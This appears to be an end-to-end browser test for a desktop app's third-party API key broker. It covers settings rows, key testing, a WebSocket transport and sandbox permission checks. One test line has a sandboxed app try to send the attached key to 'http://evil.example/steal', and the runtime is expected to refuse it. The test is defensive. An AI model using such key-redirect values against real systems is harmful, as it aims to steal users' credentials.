// End-to-end: the generic third-party-API broker (gifos.api).
// - Settings → Third-party APIs renders configured rows; ＋ Add makes a new one;
//   the Test button hits the base URL with the key attached (Token auth).
// - A sandboxed app that declares capabilities.api:["deepgram"] can call
//   gifos.api("deepgram", …); the runtime attaches the key (app never sees it),
//   returns the parsed JSON, and REFUSES to send the key to any other host.
// - Deepgram rides its NATIVE WebSocket door: a POST to /v1/listen on an entry
//   named "deepgram" is translated to Deepgram's WS protocol (runtime.js
//   deepgramListenWS) — no CORS proxy — and comes back REST-shaped. The fake's
//   WS answer is stamped request_id "ws-fake" so this suite can PROVE the WS
//   path ran, not the REST route. The Settings Test, when the REST base is
//   CORS-blocked (the fake's /wsonly base), probes the WS door and saves
//   "native WebSocket" with no proxy.
//
// Needs: static server on 8099, and test/servers/fake-keyapi.js on 8792.
const { chromium, CHROME } = require('../lib/pw');
const need = require('../lib/need');   // fixtures must be up, or say so plainly

// Ports are overridable so this suite can run beside a gate that owns the
// defaults (FAKE_KEYAPI_PORT / FAKE_PROXY_PORT are what the fakes themselves
// honor — start them with the same values).
const BASE = process.env.BASE || 'http://127.0.0.1:8099';
const KEYAPI_PORT = +(process.env.FAKE_KEYAPI_PORT || 8792);
const PROXY_PORT = +(process.env.FAKE_PROXY_PORT || 8793);
const API = 'http://127.0.0.1:' + KEYAPI_PORT;
const PROXY = 'http://127.0.0.1:' + PROXY_PORT;

let failures = 0;
function check(name, cond, detail) { console.log((cond ? 'PASS' : 'FAIL') + ' — ' + name + (detail ? '  (' + detail + ')' : '')); if (!cond) failures++; }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Pre-seed two API profiles the way the Settings UI would store them: one
// direct, one routed through the CORS proxy (as Deepgram would need).
const API_CFG = JSON.stringify({
  deepgram: { url: API, authType: 'token', key: 'dg-secret-key' },
  deepgramp: { url: API, authType: 'token', key: 'dg-secret-key', proxy: PROXY },
  // CAPITALISED on purpose. Settings stores the row under exactly what the user
  // typed into the name box, and an app asks for exactly what it declared in
  // its manifest — so a player who wrote "Maptiler", which is how MapTiler
  // spell it and what the permission sheet shows back, got NOT_CONFIGURED from
  // an app declaring `maptiler`, with a saved, tested, working key sitting
  // right there. The name is a human label for a service, not an identifier
  // anyone agreed on; its capitalisation must not carry meaning.
  Mixedcase: { url: API, authType: 'token', key: 'dg-secret-key' },
});

(async () => {
  const needPorts = {}; needPorts[KEYAPI_PORT] = 'fake-keyapi'; needPorts[PROXY_PORT] = 'fake-cors-proxy';
  await need(needPorts);
  const browser = await chromium.launch({ executablePath: CHROME });
  const context = await browser.newContext();
  await context.addInitScript((cfg) => { try { window.localStorage.setItem('gifos_api_config', cfg); } catch (e) {} }, API_CFG);
  const page = await context.newPage();
  page.on('console', (m) => { if (m.type() === 'error') console.log('  [page]', m.text()); });
  page.on('pageerror', (e) => console.log('  [pageerror]', e.message));

  await page.goto(BASE + '/index.html');
  await page.waitForSelector('.icon', { timeout: 10000 });
  await sleep(400);

  // ---- Settings → Third-party APIs ----
  await page.locator('#sys-menu-btn').click();
  await page.locator('.ctx button', { hasText: 'Settings' }).click();
  await page.waitForSelector('.api-row', { state: 'attached', timeout: 5000 });
  check('Settings shows a row for every pre-seeded third-party API', (await page.locator('.api-row').count()) === 3);
  await page.locator('summary', { hasText: 'Third-party APIs' }).click();
  await page.waitForSelector('.api-test', { state: 'visible', timeout: 5000 });
  // Test & save the seeded "deepgram" row — the fake host is CORS-open, so the
  // direct probe succeeds and it saves without a proxy.
  await page.locator('.api-test').first().click();
  await page.waitForFunction(() => /saved|rejected|reach/.test((document.querySelector('.api-status') || {}).textContent || ''), null, { timeout: 8000 });
  const st = await page.locator('.api-status').first().textContent();
  check('Test & save saves a reachable API directly', /saved · direct/.test(st), st);
  // Wrong key → rejected, and it does NOT save.
  await page.locator('.api-f[data-f="key"]').first().fill('nope');
  await page.locator('.api-test').first().click();
  await page.waitForFunction(() => /rejected/.test((document.querySelector('.api-status') || {}).textContent || ''), null, { timeout: 8000 });
  check('Test & save flags a rejected key (and refuses to save)', /rejected/.test(await page.locator('.api-status').first().textContent()));
  // The WS-native ladder: the fake's /wsonly base answers REST WITHOUT CORS
  // headers (exactly like the real api.deepgram.com), so the direct probe
  // fails and Test must walk to Deepgram's WebSocket door — and save with NO
  // proxy, because that is how every real request will travel.
  await page.locator('.api-f[data-f="key"]').first().fill('dg-secret-key');
  await page.locator('.api-f[data-f="url"]').first().fill(API + '/wsonly');
  await page.locator('.api-test').first().click();
  await page.waitForFunction(() => /WebSocket|rejected|reach/.test((document.querySelector('.api-status') || {}).textContent || ''), null, { timeout: 10000 });
  const wsSt = await page.locator('.api-status').first().textContent();
  check('a CORS-blocked Deepgram base saves via its native WebSocket', /native WebSocket/.test(wsSt), wsSt);
  const wsEntry = await page.evaluate(() => (JSON.parse(localStorage.getItem('gifos_api_config') || '{}') || {}).deepgram);
  check('…and the saved entry carries NO proxy (the WS door needs none)',
    !!wsEntry && /\/wsonly$/.test(wsEntry.url || '') && !wsEntry.proxy, JSON.stringify(wsEntry));
  // Restore the direct base; the re-save below writes it back for the app half.
  await page.locator('.api-f[data-f="url"]').first().fill(API);
  // ---- the password-reveal EYE, desktop half ----
  // run.html grew the generic eye (every input[type=password] wears one) and
  // e2e-video guards it there; this is the DESKTOP's copy — Settings' AI/API
  // key fields. It once sat uncommitted while the run.html half shipped, so the
  // desktop looked done in a diff nobody could see. Assert the sweep dressed
  // every password field, and that the eye actually reveals and re-hides.
  const eyed = await page.evaluate(() => {
    const pws = [...document.querySelectorAll('.modal input[type=password], .modal input[type=text].ai-f[data-f=key], .modal input[type=text].api-f[data-f=key]')];
    return { fields: pws.length, withEye: pws.filter((i) => i.__pwEye).length };
  });
  check('every Settings key field wears the password eye', eyed.fields > 0 && eyed.withEye === eyed.fields, JSON.stringify(eyed));
  const keyInp = page.locator('.api-f[data-f="key"]').first();
  await keyInp.locator('xpath=following-sibling::button').click();
  check('the eye reveals the key', (await keyInp.getAttribute('type')) === 'text');
  await keyInp.locator('xpath=following-sibling::button').first().click();
  check('...and re-hides it', (await keyInp.getAttribute('type')) === 'password');

  // ＋ Add makes a fresh, empty row.
  await page.locator('#api-add').click();
  check('＋ Add creates another API row', (await page.locator('.api-row').count()) === 4);
  // A row minted AFTER the load-time sweep still gets its eye (focusin delegate).
  const freshKey = page.locator('.api-row').last().locator('.api-f[data-f="key"]');
  await freshKey.focus();
  check('a freshly added row\'s key field grows an eye on focus', await freshKey.evaluate((i) => !!i.__pwEye));
  // Advanced holds an optional custom-proxy field (no manual proxy checkbox).
  check('there is no manual proxy checkbox anymore', (await page.locator('.api-proxy-ck').count()) === 0);
  await page.locator('.api-row').last().locator('.api-adv summary').click();
  check('Advanced reveals a custom-proxy URL field', await page.locator('.api-row').last().locator('.api-proxy-url').isVisible());
  // Re-save the good key so the app-side checks below still round-trip.
  await page.locator('.api-f[data-f="key"]').first().fill('dg-secret-key');
  await page.locator('.api-test').first().click();
  await page.waitForFunction(() => /saved/.test((document.querySelector('.api-status') || {}).textContent || ''), null, { timeout: 8000 });
  await page.locator('#set-close').click();

  // ---- a capability app that calls gifos.api ----
  await page.evaluate(async () => {
    const html = '<!doctype html><meta charset="utf-8"><div id="ok">…</div><div id="deny">…</div><div id="host">…</div><div id="proxy">…</div><div id="case">…</div><div id="ready">…</div>' +
      '<script>(async function(){' +
      // 1) declared API round-trips: parsed JSON back, key never visible here.
      //    "deepgram" + POST /v1/listen rides the NATIVE WebSocket door — the
      //    fake stamps its WS Metadata request_id "ws-fake", proving transport.
      '  try { var r = await gifos.api("deepgram", { method:"POST", path:"/v1/listen", query:{ model:"nova-3" }, body:{ audio:"x" }, as:"json" });' +
      '        var w = r && r.json && r.json.results.channels[0].alternatives[0].words;' +
      '        var rid = (r && r.json && r.json.metadata && r.json.metadata.request_id) || "nometa";' +
      '        document.getElementById("ok").textContent = "ok:" + r.status + ":" + (w?w.length:-1) + ":" + (w&&w[0].filler?"filler":"nofiller") + ":" + rid; }' +
      '  catch(e){ document.getElementById("ok").textContent = "ERR:"+e.message; }' +
      // 2) an UNDECLARED name is refused by the runtime.
      '  try { await gifos.api("schwab", { path:"/x" }); document.getElementById("deny").textContent = "deny:LEAKED"; }' +
      '  catch(e){ document.getElementById("deny").textContent = "deny:" + (/did not declare/.test(e.message)?"blocked":e.message); }' +
      // 3) host-pinning: an absolute off-host path is refused (key can't be redirected).
      '  try { await gifos.api("deepgram", { path:"http://evil.example/steal" }); document.getElementById("host").textContent = "host:LEAKED"; }' +
      '  catch(e){ document.getElementById("host").textContent = "host:" + (/relative path|stay on the configured host/.test(e.message)?"pinned":e.message); }' +
      // 4) the same call routed through the CORS proxy still round-trips (key attached, forwarded).
      '  try { var p = await gifos.api("deepgramp", { method:"POST", path:"/v1/listen", body:{ audio:"x" }, as:"json" });' +
      '        var pw = p && p.json && p.json.results.channels[0].alternatives[0].words;' +
      '        document.getElementById("proxy").textContent = "proxy:" + p.status + ":" + (pw?pw.length:-1); }' +
      '  catch(e){ document.getElementById("proxy").textContent = "proxy:ERR:"+e.message; }' +
      // 5) a profile saved under a DIFFERENT CASE is the same account.
      '  try { var m = await gifos.api("mixedcase", { method:"POST", path:"/v1/listen", body:{ audio:"x" }, as:"json" });' +
      '        document.getElementById("case").textContent = "case:" + m.status; }' +
      '  catch(e){ document.getElementById("case").textContent = "case:ERR:"+e.message; }' +
      '  try { var rdy = await gifos.apiReady("mixedcase");' +
      '        document.getElementById("ready").textContent = "ready:" + rdy; }' +
      '  catch(e){ document.getElementById("ready").textContent = "ready:ERR:"+e.message; }' +
      '})();<\/script>';
    const bytes = await GifOS.gif.encode({
      'manifest.json': JSON.stringify({ gifos: '1.0', appId: 'apitest', name: 'ApiTest', entry: 'index.html', capabilities: { db: true, api: ['deepgram', 'deepgramp', 'mixedcase'] } }),
      'index.html': html,
    });
    const fid = GifOS.store.uid('file');
    await GifOS.store.putFile({ id: fid, name: 'ApiTest.gif', bytes, kind: 'gif', isApp: true, appId: 'apitest', mime: 'image/gif' });
    await GifOS.store.putItem({ id: GifOS.store.uid('item'), kind: 'file', fileId: fid, name: 'ApiTest.gif', parent: null, x: 620, y: 320, iconSize: 64 });
    await GifOS.desktop.load(); await GifOS.desktop.render();
  });
  const [app] = await Promise.all([
    context.waitForEvent('page'),
    page.locator('.icon', { hasText: 'ApiTest.gif' }).dblclick(),
  ]);
  app.on('pageerror', (e) => console.log('  [app pageerror]', e.message));
  await app.waitForSelector('iframe', { timeout: 8000 });
  const fr = app.frameLocator('iframe');

  await fr.locator('#ok').filter({ hasText: /ok:|ERR:/ }).waitFor({ timeout: 10000 });
  const ok = await fr.locator('#ok').textContent();
  check('gifos.api() round-trips with the key attached — over Deepgram\'s NATIVE WebSocket, no proxy',
    /^ok:200:3:filler:ws-fake$/.test(ok), ok);

  await fr.locator('#deny').filter({ hasText: /deny:/ }).waitFor({ timeout: 8000 });
  const deny = await fr.locator('#deny').textContent();
  check('an undeclared API name is refused (manifest gate)', /deny:blocked/.test(deny), deny);

  await fr.locator('#host').filter({ hasText: /host:/ }).waitFor({ timeout: 8000 });
  const host = await fr.locator('#host').textContent();
  check('the key is host-pinned — an off-host path is refused', /host:pinned/.test(host), host);

  await fr.locator('#proxy').filter({ hasText: /proxy:/ }).waitFor({ timeout: 8000 });
  const proxy = await fr.locator('#proxy').textContent();
  check('a proxied API call round-trips through the CORS proxy (key attached, forwarded)', /^proxy:200:3$/.test(proxy), proxy);

  await fr.locator('#case').filter({ hasText: /case:/ }).waitFor({ timeout: 8000 });
  const cased = await fr.locator('#case').textContent();
  check('an API saved under a different CASE is the same account, not a missing one',
    /^case:200$/.test(cased), cased);

  await fr.locator('#ready').filter({ hasText: /ready:/ }).waitFor({ timeout: 8000 });
  const rdy = await fr.locator('#ready').textContent();
  check('…and apiReady() agrees, so an app cannot be told to set up what is already set up',
    /^ready:true$/.test(rdy), rdy);

  await app.close();
  await browser.close();
  console.log(failures ? ('\n' + failures + ' FAILURE(S)') : '\nALL PASS');
  process.exit(failures ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
